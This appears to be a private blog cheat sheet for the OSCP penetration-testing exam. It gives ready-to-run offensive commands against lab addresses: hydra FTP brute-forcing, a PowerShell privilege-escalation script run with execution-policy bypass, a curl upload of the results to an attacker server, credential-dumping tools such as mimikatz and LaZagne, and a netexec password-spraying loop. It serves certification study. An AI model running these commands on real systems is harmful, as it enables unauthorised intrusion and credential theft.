---
title: OSCP Last minute checklist
date: 2026-07-04
ShowToc: true
draft: false
TocOpen: true
password: P@ssw0rd
isPrivate: true
tags:
  - blog
  - HTB
lastmod: 2026-07-06T14:00:11.359Z
---
# Box Info

***

# NMAP

* \[ ] UDP

# FTP

* \[ ] bruteforce

```
hydra -C ./ftp-betterdefaultpasslist.txt  ftp://192.168.180.156 -f -V
```

# PDF

```
exiftool *.pdf | grep Author
```

# Windows priv

```
wget https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1

python -m uploadserver

C:\Windows\Temp>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"

curl -X POST http://192.168.45.161:8000/upload -F "files=@PrivescReport.html"
```

# Windows After admin

1. mimikatz.exe
2. -M lsassy
3. impacket-secretsdump
4. powerview KERBEROS
5. LaZagne.exe

```
PS C:\Users\Administrator\Documents> (Get-PSReadlineOption).HistorySavePath
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS C:\Users\Administrator\Documents> cd C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type *
```

```
for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n[*] Testing $proto ${auth:+(local-auth)}..."; proxychains4 netexec $proto 10.10.135.148  -u username -p  password  $auth --continue-on-success ; done; done
```

# Linux priv

* \[ ] linux-smart-enumeration
* \[ ] pspy64
